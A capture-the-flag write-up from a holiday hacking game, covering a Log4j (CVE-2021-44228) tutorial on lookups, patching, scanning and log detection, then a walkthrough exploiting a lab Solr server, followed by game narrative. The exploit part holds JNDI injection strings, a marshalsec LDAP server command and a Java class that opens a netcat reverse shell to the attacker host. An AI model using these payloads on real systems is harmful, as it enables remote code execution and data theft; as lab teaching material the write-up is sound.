<p>This challenge comes in 2 parts, one from the <em>Blue Team</em> perspective that is more of a tutorial, and the other one from the <em>Red Team</em> perspective. Let&rsquo;s start by the <em>Blue Team</em> lesson where we&rsquo;ll look at <em>Java</em> source code to better understand the <em>Log4j</em> vulnerability described in <em>CVE-2021-44228</em>.</p>
<p>We have a <em>Java</em> source code (with the <code>.java</code> file name extension), and a vulnerable version of the <em>Log4j</em> library. Display the contents of the <code>DisplayFilev1.java</code> source code with the <code>cat</code> command.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DisplayFilev1</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

        <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
        <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>

        <span class="n">String</span> <span class="n">st</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">((</span><span class="n">st</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">st</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>This <em>Java</em> program has one job: it reads a file specified as a command-line argument, and displays the contents on the screen. We&rsquo;ll use it as an example of error handling in <em>Java</em>. Let&rsquo;s compile this <em>Java</em> source so we can run it. Run the command <code>javac DisplayFilev1.java</code>. Next, run the program and display the contents of the <code>testfile.txt</code> file. Run <code>java DisplayFilev1 testfile.txt</code>.</p>
<div class="box">$ javac DisplayFilev1.java<br />
$ java DisplayFilev1 testfile.txt<br />
Hello from Prof. Petabyte!</div>
<p>This program did its job: it displayed the <code>testfile.txt</code> contents. But it also has some problems. Re-run the last command, this time trying to read <code>testfile2.txt</code>:</p>
<div class="box">$ java DisplayFilev1 testfile2.txt<br />
Exception in thread &ldquo;main&rdquo; java.io.FileNotFoundException: testfile2.txt (No such file or directory)<br />
  at java.io.FileInputStream.open0(Native Method)<br />
  at java.io.FileInputStream.open(FileInputStream.java:195)<br />
  at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:138)<br />
  at java.io.FileReader.&lt;init&gt;(FileReader.java:72)<br />
  at DisplayFilev1.main(DisplayFilev1.java:7)</div>
<p>This program doesn&rsquo;t gracefully handle a scenario where the file doesn&rsquo;t exist. Program exceptions like this one need consistent handling and logging, which is where <em>Log4j</em> comes in.</p>
<p>The <em>Apache Log4j</em> library allows developers to handle logging consistently in code. Let&rsquo;s look at an example of a modified version of this program. Run <code>cat DisplayFilev2.java</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DisplayFilev2</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">DisplayFilev2</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">st</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
            <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>

            <span class="k">while</span> <span class="o">((</span><span class="n">st</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">st</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;Unable to read file &#34;</span> <span class="o">+</span> <span class="n">args</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">+</span> <span class="s">&#34; (make sure you specify a valid file name).&#34;</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>This <em>Java</em> program has the same functionality, but the first few lines adds support for the <code>log4j</code> library. The 4th line from the bottom calls <em>Log4j</em> with the <code>logger.error()</code> function, followed by a logging message.</p>
<p>Let&rsquo;s compile this <em>Java</em> source with <em>Log4j</em> support so we can run it. Run the command <code>javac DisplayFilev2.java</code>. Then let&rsquo;s run the program and tell it to read <code>testfile2.txt</code> file. Run <code>java DisplayFilev2 testfile2.txt</code>.</p>
<div class="box">$ javac DisplayFilev2.java<br />
$ java DisplayFilev2 testfile2.txt<br />
21:26:19.160 [main] ERROR DisplayFilev2 - Unable to read file testfile2.txt (make sure you specify a valid file name).</div>
<p>This time, the program doesn&rsquo;t crash - it exits with an error message generated by <em>Log4j</em>. The <em>Log4j</em> library is valuable to produce consistent logging messages that can be handled flexibly. Unfortunately, multiple vulnerabilities allows attackers to manipulate this functionality in many versions of <em>Log4j 2</em> before version <em>2.17.0</em>.</p>
<p>The <em>CVE-2021-44228 Log4j</em> vulnerability is from improper input validation. <em>Log4j</em> includes support for lookup features, where an attacker can supply input that retrieves more data than intended from the system. Re-run the prior <code>java</code> command, replacing <code>testfile2.txt</code> with the string <code>'${java:version}'</code> (IMPORTANT: include the quotation marks in this command)</p>
<div class="box">$ java DisplayFilev2 &lsquo;${java:version}&rsquo;<br />
21:28:56.652 [main] ERROR DisplayFilev2 - Unable to read file Java version 1.8.0_312 (make sure you specify a valid file name).</div>
<p>Notice how the error has changed - instead of a file name, the error shows the Java version information. The <em>Log4j</em> lookup command <code>java:version</code> retrieves information from the host operating system. Let&rsquo;s try another example: re-run the last command, changing the <code>java:version</code> string to <code>env:APISECRET</code>.</p>
<div class="box">$ java DisplayFilev2 &lsquo;${env:APISECRET}&rsquo;<br />
21:30:26.146 [main] ERROR DisplayFilev2 - Unable to read file pOFZFiWHjqKoQaRhNYyC (make sure you specify a valid file name).</div>
<p>Using the <em>Log4j</em> env lookup, attackers can access local environment variables, possibly disclosing secrets like this one. <em>Log4j</em> also supports lookup requests using the <em>Java Naming and Directory Interface (JNDI)</em>. These requests can reach out to an attacker server to request data.</p>
<p><em>Log4j</em> lookups can also tell the vulnerable server to contact the attacker using <em>LDAP</em> and <em>DNS</em>. Run the <code>startserver.sh</code> command to launch a simple server for testing purposes. The bottom window is waiting for a connection at the specified <em>IP</em> address and port. Re-run the <code>DisplayFilev2</code> program, using the <em>Log4j</em> lookup to connect to the server:  <code>java DisplayFilev2 '${jndi:ldap://127.0.0.1:1389/Exploit}'</code>.</p>
<div class="box">$ ./startserver.ch<br />
$ java DisplayFilev2 &lsquo;${jndi:ldap://127.0.0.1:1389/Exploit}&rsquo;</div>
<p>Notice how the server received a connection from the vulnerable application in the server (&ldquo;Connection received&rdquo;)? This is a critical part of the <em>Log4j</em> vulnerability, where an attacker can force a server to connect to an attacking system to exploit the vulnerability.</p>
<div class="box">Listening on 0.0.0.0 1389<br />
Connection received on 127.0.0.1 44050<br />
0</div>
<p>To address this vulnerability, applications need an updated version of <code>Log4j</code>. Change to the <code>~/patched</code> directory by running <code>cd ~/patched</code>. List the contents of this directory with the <code>ls</code> command.</p>
<div class="box">$ cd ~/patched/<br />
$ ls<br />
DisplayFilev2.java  classpath.sh  log4j-api-2.17.0.jar  log4j-core-2.17.0.jar</div>
<p>This is the same <code>DisplayFilev2.java</code> source, but the <em>Log4j</em> library is updated to a patched version. To use the updated library, change the <em>Java</em> <code>CLASSPATH</code> variable by running <code>source classpath.sh</code>. Compile the <code>DisplayFilev2.java</code> source using the patched <em>Log4j</em> library. Run <code>javac DisplayFilev2.java</code>. Use the <em>Log4j</em> lookup string <code>java:version</code> by running the following command: <code>java DisplayFilev2 '${java:version}'</code> IMPORTANT: include the quotation marks in this command.</p>
<div class="box">$ source classpath.sh<br />
$ javac DisplayFilev2.java<br />
$ java DisplayFilev2 &lsquo;${java:version}&rsquo;<br />
21:49:34.743 [main] ERROR DisplayFilev2 - Unable to read file ${java:version} (make sure you specify a valid file name).</div>
<p>With the fixed <em>Log4j</em> library, attackers can&rsquo;t use the lookup feature to exploit library. The same program displays the <code>${java:version}</code> lookup as a literal string, without performing the actual lookup. Next, we&rsquo;ll look at a technique to scan applications for the vulnerable <em>Log4j</em> library.Run <code>cd</code> to return to the home directory. The <code>log4j2-scan</code> utility is a tool to scan for vulnerable <em>Log4j</em> application use. Run the <code>log4j2-scan</code> utility, specifying the vulnerable directory as the first command-line argument.</p>
<div class="box"><p>$ ./log4j2-scan ./vulnerable/<br />
Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)<br />
Scanning directory: ./vulnerable/ (without tmpfs, shm)<br />
[*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /home/elfu/./vulnerable/log4j-core-2.14.1.jar, log4j 2.14.1</p>
<p>Scanned 1 directories and 8 files<br />
Found 1 vulnerable files<br />
Found 0 potentially vulnerable files<br />
Found 0 mitigated files<br />
Completed in 0.00 seconds</p>
</div>
<p><em>Log4j2-scan</em> quickly spots the vulnerable version of <em>Log4j</em>. Repeat this command, changing the search directory to patched.</p>
<div class="box"><p>$ ./log4j2-scan ./patched/<br />
Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)<br />
Scanning directory: ./patched/ (without tmpfs, shm)</p>
<p>Scanned 1 directories and 5 files<br />
Found 0 vulnerable files<br />
Found 0 potentially vulnerable files<br />
Found 0 mitigated files<br />
Completed in 0.00 seconds</p>
</div>
<p><em>Log4j2-scan</em> can also scan large directories of files. This server includes the <em>Apache Solr</em> software that uses Log4j in the <code>/var/www/solr</code> directory. Scan this directory with <code>log4j2-scan</code> to identify if the server is vulnerable.</p>
<div class="box"><p>$ ./log4j2-scan /var/www/solr/<br />
Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)<br />
Scanning directory: /var/www/solr/ (without tmpfs, shm)<br />
[<em>] Found CVE-2021-44228 (log4j 2.x) vulnerability in /var/www/solr/server/lib/ext/log4j-core-2.14.1.jar, log4j 2.14.1<br />
[</em>] Found CVE-2021-44228 (log4j 2.x) vulnerability in /var/www/solr/contrib/prometheus-exporter/lib/log4j-core-2.14.1.jar, log4j 2.14.1</p>
<p>Scanned 102 directories and 1988 files<br />
Found 2 vulnerable files<br />
Found 0 potentially vulnerable files<br />
Found 0 mitigated files<br />
Completed in 0.39 seconds</p>
</div>
<p><em>Log4j2-scan</em> finds two vulnerable <em>Log4j</em> libraries: one for the <em>Solr</em> platform, and one for a third-party plugin. Both need to be patched to resolve the vulnerability. Next, we&rsquo;ll look at scanning system logs for signs of <em>Log4j</em> attack.</p>
<p>The <em>CVE-2021-44228 Log4j</em> exploit using <em>JNDI</em> for access is known as <em>Log4shell</em>. It uses the <em>JNDI</em> lookup feature to manipulate logs, gain access to data, or run commands on the vulnerable server. Web application servers are a common target. Let&rsquo;s scan the web logs on this server. Examine the files in the <code>/var/log/www</code> directory. We can scan web server logs to find requests that include the <em>Log4j</em> lookup syntax using a text pattern matching routine known as a regular expression. Examine the contents of the <code>logshell-search.sh</code> script using <code>cat</code>. This script recursively searches for <em>Log4shell</em> attack syntax in any files. Run the <code>logshell-search.sh</code> command, specifying the <code>/var/log/www</code> directory as the search target.</p>
<div class="box"><p>$ ls /var/log/www/<br />
access.log</p>
<p>$ cat logshell-search.sh<br />
#!/bin/sh<br />
grep -E -i -r '${jndi:(ldap[s]?|rmi|dns):/[^\n]+' $1</p>
<p>$ ./logshell-search.sh /var/log/www/<br />
/var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] &ldquo;GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1&rdquo; 200 1311 &ldquo;-&rdquo; &ldquo;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0&rdquo;<br />
/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] &ldquo;GET /site.webmanifest HTTP/1.1&rdquo; 304 0 &ldquo;-&rdquo; &ldquo;${jndi:dns://10.99.3.43/NothingToSeeHere}&rdquo;<br />
/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] &ldquo;GET / HTTP/1.1&rdquo; 304 0 &ldquo;-&rdquo; &ldquo;${jndi:ldap://10.3.243.6/DefinitelyLegitimate}&rdquo;</p>
</div>
<p>In this output we see three examples of <em>Log4shell</em> attack. Let&rsquo;s look at each line individually. Re-run the previous command, piping the output to <code>| sed '1!d'</code> to focus on the first line. In this first attack, we see the attacker is at <code>10.26.4.27</code>. The <em>Log4j</em> lookup command is sent as a URL <em>GET</em> parameter, attempting to use <em>JDNI</em> to reach the attacker <em>LDAP</em> server at <code>ldap://10.26.4.27:1389</code> (see in the <code>${jndi:ldap://10.26.4.27:1389/Evil}</code> string). Re-run the previous command, this time looking at the 2nd line of output.</p>
<div class="box">$ ./logshell-search.sh /var/log/www | sed &lsquo;1!d&rsquo;<br />
/var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] &ldquo;GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1&rdquo; 200 1311 &ldquo;-&rdquo; &ldquo;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0&rdquo;</div>
<p>In the second attack, we see the attacker is at <code>10.99.3.1</code>. Instead of a <em>URL GET</em> parameter, this time the exploit is sent through the browser <em>User-Agent</em> field. The attacker attempted to use <em>JDNI</em> to reach the attacker <em>DNS</em> server at <code>dns://10.99.3.43</code>, using a different <em>IP</em> than the exploit delivery address.</p>
<div class="box">$ ./logshell-search.sh /var/log/www | sed &lsquo;2!d&rsquo;<br />
/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] &ldquo;GET /site.webmanifest HTTP/1.1&rdquo; 304 0 &ldquo;-&rdquo; &ldquo;${jndi:dns://10.99.3.43/NothingToSeeHere}&rdquo;</div>
<p>Re-run the previous command, this time looking at the 3rd line of output. Here we see the attacker is at <em>10.3.243.6</em>. This attack is also sent through the browser <em>User Agent</em> field, but this more closely resembles the first attack using the attacker <em>LDAP</em> server at <em>10.3.243.6</em>. The <em>DefinitelyLegitimate</em> string is supplied by the attacker, matching a malicious <em>Java</em> class on the <em>LDAP</em> server to exploit the victim <em>Log4j</em> instance.</p>
<div class="box">$ ./logshell-search.sh /var/log/www | sed &lsquo;3!d&rsquo;<br />
/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] &ldquo;GET / HTTP/1.1&rdquo; 304 0 &ldquo;-&rdquo; &ldquo;${jndi:ldap://10.3.243.6/DefinitelyLegitimate}&rdquo;</div>
<h3 id="12b---bonus-red-log4jack">12b - Bonus! Red Log4Jack</h3>
<hr />
<table>
<thead>
<tr>
<th>Elf</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>Icky McGoop</td>
<td>The North Pole</td>
</tr>
</tbody>
</table>
<p>For the second part of the challenge, we access a terminal where we need to exploit a <em>Log4Shell</em> vulnerability. The remote host to exploit is <code>http://solrpower.kringlecastle.com:8983</code> and the goal it to have a shell on that server and read the file <code>/home/solr/kringle.txt</code>. To help with this task, we have a web servers and a <em>Netcat</em> listening on respectively on ports 8080 and 4444.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi12_02.webp" alt=" Terminal 12b description" data-caption=" Terminal 12b description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
       Terminal 12b description
      
        
        
      
    </figcaption>
  
</figure>
<p>As mentioned, the vulnerable server runs a version of <em>Apache Solr</em> that is vulnerable to <em>Log4Shell</em>. The security advisory can be found <a href="https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228">here</a>. As explained in <a href="https://www.winmill.com/blog/2021/12/27/how-to-test-your-own-vulnerability-to-the-log4shell-attack-chain-in-apache-solr/">this blogpost</a>, the vulnerable endpoint is <code>/solr/admin/cores</code> where any argument we we supply will be logged using the vulnerable <code>log4j</code> version.</p>
<p>Let&rsquo;s try to call <code>/solr/admin/cores?noob=${jndi:ldap://172.17.0.2:4444}</code> and see if one of our listener gets a hit:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi12_03.webp" alt="Log4Shell POC" data-caption="Log4Shell POC" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Log4Shell POC
      
        
        
      
    </figcaption>
  
</figure>
<p>Now that we know the system is exploitable, we can prepare the attack. We will use <code>marshalsec</code> which is a <em>Java</em> unmarshaller that we will use to get the <em>LDAP</em> call from the vulnerable server. This call will then be forwarded to our listening webserver that will serve the payload that will be executed by the vulnerable server.</p>
<p>We start the <code>marshalsec</code> service that is found in the <code>/home/troll/mashalsec</code> folder:</p>
<div class="box">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &ldquo;http://172.17.0.2:8080/#MyExploit&rdquo;</div>
<p>Where <code>MyExploit</code> will be the <em>Java</em> class that will contain our payload. This <em>Java</em> class needs to be created in the <code>/home/troll/web</code> folder where the webserver is launched. We create <code>MyExploit.java</code> that contains:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyExploit</span> <span class="o">{</span>
    <span class="kd">static</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;nc 172.17.0.2 4444 -e /bin/bash&#34;</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">err</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">err</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Then we compile it with <code>javac MyExploit.java</code>. Finally we deliver the exploit payload: <code>/solr/admin/cores?noob=$\{jndi:ldap://172.17.0.2:1389/MyExploit\}'</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/cranpi/pi12_04.webp" alt="Log4Shell exploit" data-caption="Log4Shell exploit" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Log4Shell exploit
      
        
        
      
    </figcaption>
  
</figure>
<p>Now we can read the needed file and complete the challenge.</p>
<div class="box"><p>$ cat /home/solr/kringle.txt<br />
The solution to Log4shell is patching.<br />
Sincerely,</p>
<p>Santa</p>
<p># in another pane<br />
$ runtoanswer<br />
What is Santa&rsquo;s solution for Log4j?</p>
<p>&gt; patching</p>
</div>
<h2 id="the-narrative">The Narrative</h2>
<hr />
<p><strong>Jack Frost</strong> is back to get his revenge over last year failure! He has decided to gather an army of trolls and to build a majestic and big tower, the <em>Frost Tower</em>, next to <strong>Santa</strong>&rsquo;s Castle! He planned as well to organize a bigger conference than <strong>Santa</strong>&rsquo;s, called <em>Frostfest</em> and to sell more goodies. All this in the hope to get the elves on his side, to steal <em>Santa</em>&rsquo;s sleigh technology, improve it, cause mayhem in the delivery of presents to kids all over the world and finally come as a savior in the eyes of everybody!</p>
<p>But this was without counting on some trolls that started to be suspicious and who started helping us defeat <strong>Jack</strong> once and for all. Once we completed all the objectives and repaired the <em>Speak&amp;Spell</em> device, an alien spaceship landed on top of the <em>Frost Tower</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj13_04.webp" alt="Alien spaceship" data-caption="Alien spaceship" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Alien spaceship
      
        
        
      
    </figcaption>
  
</figure>
<p>Inside, the spaceship, some <em>Frostians</em>, accompanied by their princess <strong>Buttercup</strong>, came to take <strong>Jack Frost</strong> back to his planet and bring him to justice. They explain:</p>
<div class="alert alert-info" role="alert" data-dir="ltr">We come in peace! I am Icy Sickles from ice Planet Frost.<br />
Many centuries ago, we Frostian trolls sent an expedition to study your planet and peoples.<br />
Jack Frost, scion of Planet Frost’s ruling family, captained that long-ago mission, which carried many hundreds of our people to your planet to conduct our research.</div>
<div class="alert alert-info" role="alert" data-dir="ltr">I am Erin Fection, the pilot of this interstellar spaceship.<br />
Our first expedition established a base in the land of Oz, where our researchers became known as “Munchkins.”<br />
We received a message from them long ago about a Great Schism, where the Frostian expedition split into two warring factions: Munchkins and Elves.<br />
Thankfully, they managed to establish an uneasy peace by relocating the Elves to the North Pole.<br />
Since then, we have heard nothing from the expedition. They went interstellar radio silent. Until NOW.</div>
<div class="alert alert-info" role="alert" data-dir="ltr">I am Buttercup, Princess of ice Planet Frost.<br />
Thanks to your help, we received the message from the device summoning us back to Earth to address the recent unpleasantness.<br />
We had no idea that Jack Frost would cause such trouble! We sincerely apologize.<br />
We will take Jack back home to Planet Frost, along with all the other trolls.<br />
The Elves and Munchkins, of course, can remain if they opt to do so.<br />
Fear not, we WILL bring Jack and any guilty trolls to justice for their infractions. They will not bother your planet any longer.<br />
Again, we apologize for all the troubles he has caused, and we sincerely THANK YOU for your help!<br />
And, now that you&rsquo;ve helped us solve everything, feel free to show off your skills with some swag - only for our victors!</div>
<p>And <strong>Santa</strong> to add:</p>
<div class="alert alert-info" role="alert" data-dir="ltr">The Frostians have reached out to me via video link. They’ve explained to me all that has happened.<br />
I’d like to thank you for your truly excellent work in foiling Jack’s plans and ensuring that he is finally brought to justice.<br />
On behalf of all of us here at the North Pole, we wish you and yours a happy and healthy Holiday Season.<br />
Thank you and HAPPY HOLIDAYS from me and all of the elves.<br />
Ho Ho Ho!</div>
<h2 id="christmas-eggs">Christmas Eggs</h2>
<p>One of the quests I enjoy the most in the <em>Holiday Hack</em> challenges is to find as many hidden <em>Eggs</em> as possible! Here are the ones I spotted this year:</p>
<table>
<thead>
<tr>
<th>Location</th>
<th>Egg</th>
</tr>
</thead>
<tbody>
<tr>
<td>Kringlecon Title</td>
<td><em>Calling Birds</em> comes from The Twelve Days of Christmas carol (the 4th day of Christmas for the 4th KringleCon)</td>
</tr>
<tr>
<td>Castle Entrance</td>
<td>The main painting refers to Kringlecon 3</td>
</tr>
<tr>
<td>Talks Lobby</td>
<td>The music that plays is based on the Wellerman song</td>
</tr>
<tr>
<td>Jack&rsquo;s Studio</td>
<td>We see the presents Jack&rsquo;s offered to Santa&rsquo;s in Kringlecon 3</td>
</tr>
<tr>
<td>Jack&rsquo;s Restroom</td>
<td>We find Jason (who find new hiding places every year) when flushing the toilets</td>
</tr>
<tr>
<td>Rooftop</td>
<td>Numby Chiblain says &ldquo;Klatu Barada Nikto!&rdquo; which is a reference to the 1951 movie <em>The Day the Earth Stood Still</em></td>
</tr>
<tr>
<td>Rooftop</td>
<td>The musical notes played by the <em>Speak&amp;Bell</em> are the ones played in <em>Close Encounters of the Third Kind</em> by humans to get in contact with aliens</td>
</tr>
<tr>
<td>Frostavator</td>
